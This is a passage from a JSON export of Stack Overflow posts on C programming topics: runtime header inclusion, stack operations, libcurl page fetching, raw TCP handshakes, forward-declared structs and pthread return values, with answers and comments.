&lt;your_header_file.h&gt;</code> or <code>#include \"your_header_file.h\"</code>.</p>\n"}], "owner": {"reputation": 21, "user_id": 8143500, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-DdpP-KjD2pQ/AAAAAAAAAAI/AAAAAAAAAGk/YQ-LJZfzC-U/photo.jpg?sz=128", "display_name": "Theo chan", "link": "https://stackoverflow.com/users/8143500/theo-chan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 0, "accepted_answer_id": 44667647, "answer_count": 2, "score": 0, "last_activity_date": 1498036457, "creation_date": 1498022701, "question_id": 44667436, "link": "https://stackoverflow.com/questions/44667436/include-a-variable-header-path-in-c", "title": "include a variable header path in C", "body": "<p>I am trying to include a header file input by user at run time.</p>\n\n<pre><code>int main(){\nchar *p;\nscanf(\"%s\",p);\n#include p\n#define PATH path\n#include PATH\n}\n</code></pre>\n\n<p>Both the methods to include a header file are not working.Is there any way to include a header file input by user at run time?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1498022474, "post_id": 44667336, "comment_id": 76319706, "body": "Welcome to StackOverlfow. Read this and the material your teacher gave you: <a href=\"https://en.wikipedia.org/wiki/Stack_(abstract_data_type)\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Stack_(abstract_data_type)</a> Then read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and take the <a href=\"https://stackoverflow.com/tour\">tour</a>."}], "answers": [{"tags": [], "owner": {"reputation": 198, "user_id": 5247258, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1b65b54bf22c8e2701159dd5a904550a?s=128&d=identicon&r=PG&f=1", "display_name": "Malinda", "link": "https://stackoverflow.com/users/5247258/malinda"}, "is_accepted": false, "score": 0, "last_activity_date": 1498023249, "creation_date": 1498023249, "answer_id": 44667536, "question_id": 44667336, "link": "https://stackoverflow.com/questions/44667336/stack-in-data-structures/44667536#44667536", "title": "Stack In Data Structures", "body": "<p>Refer <a href=\"https://en.wikibooks.org/wiki/Data_Structures/Stacks_and_Queues\" rel=\"nofollow noreferrer\">https://en.wikibooks.org/wiki/Data_Structures/Stacks_and_Queues</a></p>\n\n<ul>\n<li>Line 1 - Remove G from A and Add G to the Stack B</li>\n<li>Line 2 - Remove D from A Add D to the Stack B</li>\n<li>Line 3 - Don't remove E from A and add E to B</li>\n<li>Line 4 - A is not empty therefore Line 5 will not be executed. and push Z to B</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 1831, "user_id": 4278074, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/spNDb.jpg?s=128&g=1", "display_name": "Aleksandar Makragi\u0107", "link": "https://stackoverflow.com/users/4278074/aleksandar-makragi%c4%87"}, "edited": false, "score": 0, "creation_date": 1498025539, "post_id": 44667550, "comment_id": 76320977, "body": "Now it is correct :)"}], "tags": [], "owner": {"reputation": 640, "user_id": 7086962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xIkMC.jpg?s=128&g=1", "display_name": "Chandrahas Aroori", "link": "https://stackoverflow.com/users/7086962/chandrahas-aroori"}, "is_accepted": false, "score": 0, "last_activity_date": 1498025484, "last_edit_date": 1498025484, "creation_date": 1498023304, "answer_id": 44667550, "question_id": 44667336, "link": "https://stackoverflow.com/questions/44667336/stack-in-data-structures/44667550#44667550", "title": "Stack In Data Structures", "body": "<p>Basically the given pseudo code will, </p>\n\n<ol>\n<li>Pop (ie remove the top element) off from Stack A (E) and then push it(ie place it in the bottom most spot) in Stack B. </li>\n<li>Pop off Stack A (D) and then push it in Stack B.</li>\n<li><p>It will peek (ie not remove from stack but view) at the remaining element (G) and push it to B. </p></li>\n<li><p>it will check if the stack A is empty and if it is (which it isn't) then it will push 'Z' onto B.</p></li>\n</ol>\n\n<p><code>\n      |____|                          |____|\n      |____|                          |  Z |\n      |____|                          |  G |\n      |____|                          |  D |\n      |  G |                          |  E |\n   stack frame A                    stack frame B\n</code></p>\n"}, {"tags": [], "owner": {"reputation": 1831, "user_id": 4278074, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/spNDb.jpg?s=128&g=1", "display_name": "Aleksandar Makragi\u0107", "link": "https://stackoverflow.com/users/4278074/aleksandar-makragi%c4%87"}, "is_accepted": false, "score": 1, "last_activity_date": 1498025213, "creation_date": 1498025213, "answer_id": 44668001, "question_id": 44667336, "link": "https://stackoverflow.com/questions/44667336/stack-in-data-structures/44668001#44668001", "title": "Stack In Data Structures", "body": "<p>You start with:</p>\n\n<pre><code>      |____|                          |____|\n      |____|                          |____|\nTop -&gt;|  E |                          |____|\n      |  D |                          |____|\n      |  G |                          |____|\n   stack frame A                    stack frame B\n</code></pre>\n\n<p><strong>1.</strong></p>\n\n<pre><code>B.push (A.pop ()); \n</code></pre>\n\n<p>This means, push on B stack what you retrieve (remove) from top of A stack.</p>\n\n<pre><code>  |_____|                          |____|\n  |_____|                          |    |\n  |_____|                          |    |\n  |__D__|                          |    |\n  |__G__|                          |  E |\n stack frame A                    stack frame B\n</code></pre>\n\n<p><strong>2.</strong></p>\n\n<pre><code>B.push (A.pop ());\n</code></pre>\n\n<p>Same here.</p>\n\n<pre><code>  |_____|                          |____|\n  |_____|                          |    |\n  |_____|                          |    |\n  |_____|                          |  D |\n  |__G__|                          |  E |\n stack frame A                    stack frame B\n</code></pre>\n\n<p><strong>3.</strong></p>\n\n<pre><code>B.push (A.peek());\n</code></pre>\n\n<p>This means, see what is on top of A stack, and push it to B stack. But do not remove it from A stack. </p>\n\n<pre><code>  |_____|                          |____|\n  |_____|                          |    |\n  |_____|                          |  G |\n  |_____|                          |  D |\n  |__G__|                          |  E |\n stack frame A                    stack frame B\n</code></pre>\n\n<p><strong>4.</strong></p>\n\n<pre><code>if (A. IsEmpty())\n       A.push('Z'); \n   else \n       B.push ('Z');\n</code></pre>\n\n<p>This means - If stack A is empty, push letter Z on A, otherwise push letter Z on stack B.</p>\n\n<pre><code>  |_____|                          |____|\n  |_____|                          |  Z |\n  |_____|                          |  G |\n  |_____|                          |  D |\n  |__G__|                          |  E |\nstack frame A                    stack frame B\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7913270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75c4a398d07a66e6470ace4a5efcae3d?s=128&d=identicon&r=PG&f=1", "display_name": "seanderik", "link": "https://stackoverflow.com/users/7913270/seanderik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "closed_date": 1498044344, "answer_count": 3, "score": -3, "last_activity_date": 1498025484, "creation_date": 1498022225, "question_id": 44667336, "link": "https://stackoverflow.com/questions/44667336/stack-in-data-structures", "closed_reason": "Not suitable for this site", "title": "Stack In Data Structures", "body": "<pre><code>1.B.push (A.pop ()); \n2.B.push (A.pop ()); \n3.B.push (A.peek()); \n4.if (A. IsEmpty())\n       A.push('Z'); \n   else \n       B.push ('Z');\n\n      |____|                          |____|\n      |____|                          |____|\nTop -&gt;|  E |                          |____|\n      |  D |                          |____|\n      |  G |                          |____|\n   stack frame A                    stack frame B\n</code></pre>\n\n<p>Hi All Can Please Anyone Explain whats happening with Line 1 to 4? Having problem in understanding the lines.</p>\n"}, {"tags": ["c", "curl", "libcurl"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 2, "creation_date": 1498022861, "post_id": 44667323, "comment_id": 76319862, "body": "Welcome to StackExchange. However, you seem to be on the wrong site; for improvement recommendations on basically working code you probably want to go to <a href=\"https://codereview.stackexchange.com\">codereview.stackexchange.com</a>. However, if there is a specific problem with a certain part of your code, please explain in more detail and people here will be happy to help. You might want to take the <a href=\"https://stackoverflow.com/tour\">tour</a> and read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>. When you did that: Welcome to StackOverflow, the Q/A site for specific programmin questions."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1498024548, "post_id": 44667323, "comment_id": 76320496, "body": "I&#39;m voting to close this question as off-topic because for improvement recommendations on basically working code you probably want to go to codereview.stackexchange.com."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1498024557, "post_id": 44667323, "comment_id": 76320503, "body": "@Yunnosch Perfect ! Sensei teach me !"}, {"owner": {"reputation": 640, "user_id": 7086962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xIkMC.jpg?s=128&g=1", "display_name": "Chandrahas Aroori", "link": "https://stackoverflow.com/users/7086962/chandrahas-aroori"}, "edited": false, "score": 0, "creation_date": 1498024883, "post_id": 44667323, "comment_id": 76320658, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/1011339/how-do-you-make-a-http-request-with-c\">How do you make a HTTP request with C++?</a>"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 640, "user_id": 7086962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xIkMC.jpg?s=128&g=1", "display_name": "Chandrahas Aroori", "link": "https://stackoverflow.com/users/7086962/chandrahas-aroori"}, "edited": false, "score": 0, "creation_date": 1498025169, "post_id": 44667323, "comment_id": 76320809, "body": "@ChandrahasAroori C, not C++, and more off-topic than duplicate."}, {"owner": {"reputation": 19, "user_id": 8192025, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e34f8cce0a32b5d4987224fd5033dc53?s=128&d=identicon&r=PG", "display_name": "Benedict", "link": "https://stackoverflow.com/users/8192025/benedict"}, "edited": false, "score": 0, "creation_date": 1498025422, "post_id": 44667323, "comment_id": 76320929, "body": "okay... i will switch to codereview. Sorry, my bad!"}, {"owner": {"reputation": 12119, "user_id": 5265292, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/0b9b1031971201aa02e13287af690946?s=128&d=identicon&r=PG&f=1", "display_name": "grek40", "link": "https://stackoverflow.com/users/5265292/grek40"}, "edited": false, "score": 1, "creation_date": 1498026122, "post_id": 44667323, "comment_id": 76321225, "body": "Before going to codereview, make sure to read the following: <a href=\"https://ericlippert.com/2012/12/17/performance-rant/\" rel=\"nofollow noreferrer\">Eric Lippert&#39;s blog: Which is faster?</a>. It&#39;s not 100% targeted at your question, but still relevant."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1498028748, "post_id": 44667323, "comment_id": 76322640, "body": "Surely that&#39;s not the fastest way. You could skip lubcurl and use raw sockets, you could use prepared HTTP requests then you could prepare TCP packets beforehand in order to skip TCP processing in the kernel, you could create specialized custom silicon chip... That way you&#39;d save some 4 or maybe even 5 nanoseconds. But is it worth the time?"}, {"owner": {"reputation": 887, "user_id": 1691280, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f06b990f79e44451679541f695648de4?s=128&d=identicon&r=PG", "display_name": "Brandin", "link": "https://stackoverflow.com/users/1691280/brandin"}, "edited": false, "score": 0, "creation_date": 1498033105, "post_id": 44667323, "comment_id": 76325373, "body": "Does &quot;faster&quot; mean reducing bandwidth? You could try fetching blocks of the web page at a time and perform your search after each block is received. For example, if you find the data you&#39;re looking for in the first few blocks, you&#39;re done, so you can stop transferring at that point."}], "answers": [{"comments": [{"owner": {"reputation": 887, "user_id": 1691280, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f06b990f79e44451679541f695648de4?s=128&d=identicon&r=PG", "display_name": "Brandin", "link": "https://stackoverflow.com/users/1691280/brandin"}, "edited": false, "score": 1, "creation_date": 1498033591, "post_id": 44670406, "comment_id": 76325694, "body": "In grep you can add the -m 1 parameter to stop the search after the first match, and add option e.g.  -C 3 to add context lines (e.g. 3 lines) if needed. Stopping after the first match will allow ncat to stop transferring, possibly reducing bandwidth if &quot;value_description&quot; is found near the beginning of the data."}], "tags": [], "owner": {"reputation": 5996, "user_id": 1152524, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/b2e23f3f9bf82e6fe806261f50b2f9b6?s=128&d=identicon&r=PG&f=1", "display_name": "txtechhelp", "link": "https://stackoverflow.com/users/1152524/txtechhelp"}, "is_accepted": false, "score": 0, "last_activity_date": 1498032794, "creation_date": 1498032794, "answer_id": 44670406, "question_id": 44667323, "link": "https://stackoverflow.com/questions/44667323/fastest-way-to-fetch-value-from-website-in-c/44670406#44670406", "title": "fastest way to fetch value from website in c", "body": "<blockquote>\n  <p>I want to make a http request, get the website content and check one specific element ... But I wonder if this is the fastest way.</p>\n</blockquote>\n\n<p>First, \"fast\" in this context is relative as your bottleneck is bandwidth, not CPU. Next, if all you're doing is trying to find a specific element from web content, you could use <code>telnet</code> or if you have <a href=\"http://nmap.org/ncat/\" rel=\"nofollow noreferrer\"><code>ncat</code> </a> installed on your system, you could just do something like the following:</p>\n\n<pre><code>echo \"GET /index.php\" | ncat www.somewebsite.com 80 | grep \"value_description\"\n</code></pre>\n\n<p>This can be scripted and adjusted as needed, but scraping for a single value you can use <code>grep</code>, <code>sed</code> and/or <code>awk</code> to mine the data without the need to build a C application.</p>\n\n<p>Hope that can help.</p>\n"}], "owner": {"reputation": 19, "user_id": 8192025, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e34f8cce0a32b5d4987224fd5033dc53?s=128&d=identicon&r=PG", "display_name": "Benedict", "link": "https://stackoverflow.com/users/8192025/benedict"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 131, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1498032794, "creation_date": 1498022153, "last_edit_date": 1498024319, "question_id": 44667323, "link": "https://stackoverflow.com/questions/44667323/fastest-way-to-fetch-value-from-website-in-c", "title": "fastest way to fetch value from website in c", "body": "<p>I want to make a http request, get the website content and check one specific element. Currently I'm doing it with lcurl (got explanations from a tutorial). Here is an excerpt of my code:</p>\n\n<pre><code>curl_global_init(CURL_GLOBAL_ALL);\nCURL *myHandle;\nCURLcode result;\nstruct BufferStruct output;\noutput.buffer = NULL;\noutput.size = 0;\n\n//requested value is on this website\nchar* url = \"https://www.somewebsite.com\";\n\n//set curl handle to write the website content into buffer\nmyHandle = curl_easy_init();\ncurl_easy_setopt(myHandle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);\ncurl_easy_setopt(myHandle, CURLOPT_WRITEDATA, (void*)&amp;output);\ncurl_easy_setopt(myHandle, CURLOPT_URL, url);\ncurl_easy_perform( myHandle );\n\n//searching for position of the requested value.\nuint8_t* value_position = strstr(output.buffer, \"value_description\");\n//copy the value (8 chars) into a buffer defined earlier\nstrncpy(value, value_position, 8);\n//... clean up etc.\n</code></pre>\n\n<p>The code works. But I wonder if this is the fastest way...\nAny ideas how to do it faster? Thanks alot!</p>\n"}, {"tags": ["python", "c", "sockets", "tcp"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1498021337, "post_id": 44667152, "comment_id": 76319310, "body": "The problem is that you&#39;re using the <i>same</i> address as your operating system. Well, depending on your OS, you could program your firewall so that it <i>drops</i> packets <i>from</i> 192.168.1.102:80 altogether..."}, {"owner": {"reputation": 889, "user_id": 7709727, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5aad459e897d2e3a8a4613be455ecb16?s=128&d=identicon&r=PG&f=1", "display_name": "Eric Stdlib", "link": "https://stackoverflow.com/users/7709727/eric-stdlib"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1498454406, "post_id": 44667152, "comment_id": 76487883, "body": "It seems that the only way is using iptables block any outgoing RST packets, because the behaviour of the TCP queue inside the system cannot be affected by any sockets."}], "owner": {"reputation": 889, "user_id": 7709727, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5aad459e897d2e3a8a4613be455ecb16?s=128&d=identicon&r=PG&f=1", "display_name": "Eric Stdlib", "link": "https://stackoverflow.com/users/7709727/eric-stdlib"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "closed_date": 1498057506, "answer_count": 0, "score": 0, "last_activity_date": 1498021123, "creation_date": 1498021123, "question_id": 44667152, "link": "https://stackoverflow.com/questions/44667152/how-to-bind-ports-for-tcp-clients-when-using-raw-packet-sending-tcp-packets-in-p", "closed_reason": "Duplicate", "title": "How to bind ports for TCP clients when using raw packet sending TCP packets in Python?", "body": "<p>I want to simulate a TCP handshake with Python. For example, I want to establish a connection from <code>192.168.0.101:1234</code> to <code>192.168.1.102:80</code>. I followed <a href=\"http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/\" rel=\"nofollow noreferrer\">this program</a> and wrote a similar program sending an SYN packet to the server. The server responds an SYN+ACK packet to me, but my operating system sends an RST packet immediately, interrupting the communication. </p>\n\n<p>Thus, I hope to let the client listen to the 1234 port and do no respond automatically. However, after I bind the address with <code>socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code>, the Python module sends the RST packets, instead of the system. </p>\n\n<p>How can I achieve such goal? I think I should control the Inernet Layer, but I have no idea how to do that. </p>\n\n<p>Thank you. </p>\n"}, {"tags": ["c", "list", "graph-databases"], "comments": [{"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498020822, "post_id": 44666870, "comment_id": 76319147, "body": "My hint: google &quot;C forward declaration&quot;. This is what is needed here: insert <code>struct l_est;</code> as 1st line and use <code>struct l_est *pathsIn, pathsOut;</code> in <code>struct Vrtc</code>."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498021497, "post_id": 44666870, "comment_id": 76319357, "body": "I would change the title to &quot;How to use a struct before it is defined&quot; or &quot;How to make cross pointers in structs&quot;. Btw. I found: <a href=\"https://stackoverflow.com/questions/20341335/cross-referencing-structs-in-c\">SO: Cross referencing structs in C</a>."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498021635, "post_id": 44666870, "comment_id": 76319403, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/20341335/cross-referencing-structs-in-c\">Cross referencing structs in C</a>"}], "answers": [{"tags": [], "owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "is_accepted": true, "score": 0, "last_activity_date": 1498021323, "creation_date": 1498021323, "answer_id": 44667178, "question_id": 44666870, "link": "https://stackoverflow.com/questions/44666870/how-to-make-cross-pointers-in-structs/44667178#44667178", "title": "How to make cross pointers in structs", "body": "<p>You have to use a <a href=\"https://en.wikipedia.org/wiki/Forward_declaration\" rel=\"nofollow noreferrer\"><strong>forward declaration</strong></a>:</p>\n\n<pre><code>typedef struct l_est l_est;\n\ntypedef struct {\n  int id;\n  char *str;\n  l_est *pathsIn, *pathsOut;\n} Vrtc;\n\ntypedef struct l_est {\n  Vrtc **Vert;\n  int qtdElem, maxElem;\n} l_est;\n</code></pre>\n\n<p>The first type definition of <code>struct l_est</code> is a so-called \"incomplete type\". This type may <em>not be</em> used for variables or with <code>sizeof</code> but it <em>may</em> be used to declare pointer.</p>\n\n<p>The incomplete type may later be overridden by a \"complete type\" without complaints of the compiler.</p>\n\n<p>Similar solutions can be found in other languages (e.g. Pascal).</p>\n"}], "owner": {"reputation": 13, "user_id": 8191900, "user_type": "registered", "profile_image": "https://graph.facebook.com/1600218340051377/picture?type=large", "display_name": "Arthur Ydalgo", "link": "https://stackoverflow.com/users/8191900/arthur-ydalgo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 44667178, "answer_count": 1, "score": 1, "last_activity_date": 1498023457, "creation_date": 1498019125, "last_edit_date": 1498023457, "question_id": 44666870, "link": "https://stackoverflow.com/questions/44666870/how-to-make-cross-pointers-in-structs", "title": "How to make cross pointers in structs", "body": "<p>So here's my problem, I want to create a graph-database. My concept idea is a node (which will be of type \"Vrtc\" in the code. It will cointain an (int) id, a (char*) string (called \"str\") and a list (l_est) of paths in and out.\nThe list will contain an \"array\" of pointers to nodes, the amount of nodes in the list, and the maximum number of nodes. </p>\n\n<pre><code>typedef struct Vrtc\n{\n    int id;\n    char *str;\n    l_est *pathsIn;\n    l_est *pathsOut;\n} Vrtc;\n\ntypedef struct l_est{\n    Vrtc **Vert;\n    int qtdElem;\n    int maxElem;\n} l_est;\n</code></pre>\n\n<p>As you may know, there'll be a problem of \"Unknow type/Type undeclared inside the node. I was hoping anyone could give a tip of how to do it, if it is possible.</p>\n"}, {"tags": ["c", "multithreading", "pthreads"], "comments": [{"owner": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 1, "creation_date": 1498018354, "post_id": 44666733, "comment_id": 76318432, "body": "You put <code>pthread_join</code> at the point where you positively need the function to have completed."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 2, "creation_date": 1498018420, "post_id": 44666733, "comment_id": 76318454, "body": "If you don&#39;t want to block then don&#39;t call <code>pthread_join</code>. If you need the result of the thread then you will need to block or poll at some point. It&#39;s not clear exactly what behaviour you want."}, {"owner": {"reputation": 21, "user_id": 1538367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be9f3bdd9ef0a4ab0e61dd45edb3be96?s=128&d=identicon&r=PG&f=1", "display_name": "Sandaruwan Fernando", "link": "https://stackoverflow.com/users/1538367/sandaruwan-fernando"}, "edited": false, "score": 0, "creation_date": 1498018707, "post_id": 44666733, "comment_id": 76318527, "body": "Thanks for the answer, if i remove <b>thread_join</b> function how can i get return value?"}, {"owner": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "edited": false, "score": 3, "creation_date": 1498020753, "post_id": 44666733, "comment_id": 76319132, "body": "Also note that you&#39;re returning a local array which you cannot use after the function has finished"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1498021105, "post_id": 44666733, "comment_id": 76319239, "body": "@SandaruwanFernando you need to have some kind of event handling mechanism in the main thread; so you&#39;d notify it that the NFC read has now completed."}, {"owner": {"reputation": 21, "user_id": 1538367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be9f3bdd9ef0a4ab0e61dd45edb3be96?s=128&d=identicon&r=PG&f=1", "display_name": "Sandaruwan Fernando", "link": "https://stackoverflow.com/users/1538367/sandaruwan-fernando"}, "reply_to_user": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "edited": false, "score": 0, "creation_date": 1498021524, "post_id": 44666733, "comment_id": 76319364, "body": "@SamiKuhmonen do you have any event handling mechanism example for beginners?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1498025258, "post_id": 44666733, "comment_id": 76320852, "body": "@Scheff even for a &quot;simple&quot; thing like this, <code>volatile</code> is not sufficient: the threads might run on different CPUs, therefore requiring a memory barrier. The simplest thing to use might be pthread mutexes and condition variables."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498025571, "post_id": 44666733, "comment_id": 76320990, "body": "@Scheff but in the code snippet, I don&#39;t see the need for synchronization other than <code>pthread_join()</code> at all. Just fixing the error of returning a &quot;local variable&quot; should produce working code. Maybe there&#39;s another problem not shown in OP&#39;s code."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 3, "creation_date": 1498029322, "post_id": 44666733, "comment_id": 76322990, "body": "Calling <code>pthread_create</code> immediately followed by <code>pthread_join</code> is just a very inefficient way to call a function."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498030957, "post_id": 44666733, "comment_id": 76324042, "body": "@FelixPalmen Using <code>volatile</code> without atomic access might be not sufficient but with atomic access it should. Atomic access is probably much cheaper than a mutex. I found this (accepted) <a href=\"https://stackoverflow.com/a/9201088/7478597\">answer for C++</a> (beside of the fact that I already did it this way by myself). I <i>assume</i> that <code>std::atomic</code> is based on the same techniques like the functions in <a href=\"http://en.cppreference.com/w/c/atomic\" rel=\"nofollow noreferrer\">Atomic Library</a>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498031448, "post_id": 44666733, "comment_id": 76324364, "body": "@Scheff: I was refering to the first part of your comment. Of course, an <i>atomic</i> type is sufficient. Whether this is the simplest thing is debatable. If it&#39;s really just used for a flag, of course it is more efficient than locking."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498031743, "post_id": 44666733, "comment_id": 76324556, "body": "@FelixPalmen I agree and replace my first comment: The IMHO simplest kind of simple event handling between threads is using a variable (e.g. of type <code>int</code>) which is written in one thread and 